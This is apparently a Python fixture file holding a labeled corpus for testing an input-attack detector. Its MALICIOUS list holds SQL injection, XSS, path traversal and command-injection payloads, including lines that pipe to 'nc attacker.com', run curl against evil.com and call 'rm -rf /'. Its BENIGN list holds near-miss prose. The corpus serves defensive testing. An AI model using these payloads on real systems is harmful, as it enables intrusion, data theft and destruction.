"""Labeled corpus for measuring detector precision and recall.

MALICIOUS: representative payloads across SQLi, XSS, path traversal, and
command injection (including URL-encoded variants).
BENIGN: ordinary inputs that naive detectors tend to false-positive on
(SQL-ish prose, code snippets, file paths, marketing copy).
"""
from __future__ import annotations

MALICIOUS: list[str] = [
    # SQL injection
    "1' OR '1'='1",
    "admin'--",
    "1; DROP TABLE users;",
    "' UNION SELECT username, password FROM users--",
    "1 OR 1=1",
    "%27%20OR%20%271%27%3D%271",  # url-encoded ' OR '1'='1
    "'; WAITFOR DELAY '0:0:5'--",
    "1) OR pg_sleep(5)--",
    # XSS
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",  # url-encoded
    "<body onload=alert('xss')>",
    "<iframe src=javascript:alert(1)>",
    # Path traversal
    "../../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\cmd.exe",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # url-encoded ../../etc/passwd
    "/var/www/../../etc/shadow",
    # Command injection
    "; cat /etc/passwd",
    "| nc attacker.com 4444",
    "$(curl http://evil.com/x.sh)",
    "`whoami`",
    "&& rm -rf /",
    "test; ls -la",
]

BENIGN: list[str] = [
    "Alice Johnson",
    "alice@example.com",
    "The quick brown fox jumps over the lazy dog",
    "I want to select the best option for our database",  # 'select' + 'database' as prose
    "SELECT your plan and continue",  # marketing copy with SELECT
    "C:/Users/alice/Documents/report.pdf",
    "/api/v2/products?category=electronics&sort=price",
    "order by date please",  # 'order by' as prose
    "2024-05-21T10:30:00Z",
    "https://example.com/path/to/resource",
    "Price: $19.99 (was $29.99)",
    "user_id=12345&token=abc",
    "function add(a, b) { return a + b; }",
    "Drop me an email when you union the teams",  # 'drop' + 'union' as prose
    "café résumé naïve",
    "1 + 1 = 2",
    "The script ran successfully",  # 'script' as a word, not a tag
    "Search for: best laptops 2024",
    "path/to/my/file.txt",
    "and 2 plus 2 equals 4",
]
